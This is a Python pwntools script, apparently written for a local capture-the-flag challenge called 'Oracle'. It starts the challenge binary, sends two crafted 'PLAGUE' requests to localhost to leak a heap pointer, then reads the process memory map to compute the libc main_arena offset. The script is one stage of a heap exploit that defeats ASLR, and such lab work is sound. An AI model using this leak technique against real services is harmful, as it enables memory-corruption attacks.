#!/usr/bin/env python3
"""Compute main_arena offset from the system libc."""
import subprocess, time, os, signal

BASE = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Oracle/pwn_oracle/challenge'

with open('/tmp/oracle_pid.txt', 'w') as f:
    f.write('')

oracle_proc = subprocess.Popen(
    [f'{BASE}/glibc/ld-linux-x86-64.so.2', '--library-path', f'{BASE}/glibc', f'{BASE}/oracle'],
    cwd=BASE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
)
time.sleep(2)
print(f'PID={oracle_proc.pid}')

with open('/tmp/oracle_pid.txt', 'w') as f:
    f.write(str(oracle_proc.pid))

from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

# Ph1
r = remote('127.0.0.1', 1337, timeout=10)
r.send(b'PLAGUE bbb HTTP/1.0\r\nContent-Length: 2048\r\nPlague-Target: dummy\r\n\r\n' + b'A' * 16)
r.recvall(timeout=3)
r.close()
print('Ph1 done')

# Ph2
r = remote('127.0.0.1', 1337, timeout=10)
r.send(b'PLAGUE ccc HTTP/1.0\r\nContent-Length: 2048\r\n\r\n' + b'X')
data = r.recvall(timeout=5)
r.close()
bk = u64(data[data.find(b'Attempted plague: ') + len(b'Attempted plague: '):][8:16])
print(f'bk = 0x{bk:x}')

# Read maps
with open(f'/proc/{oracle_proc.pid}/maps') as f:
    maps = f.read()
for line in maps.split('\n'):
    if 'libc' in line and 'r-xp' in line:
        addr = line.split('-')[0]
        libc_base = int(addr, 16)
        print(f'libc_base = 0x{libc_base:x}')
        main_arena = bk - 0x60
        offset = main_arena - libc_base
        print(f'main_arena = 0x{main_arena:x}')
        print(f'MAIN_ARENA_OFFSET = 0x{offset:x}')
        break

os.kill(oracle_proc.pid, signal.SIGKILL)
oracle_proc.wait()
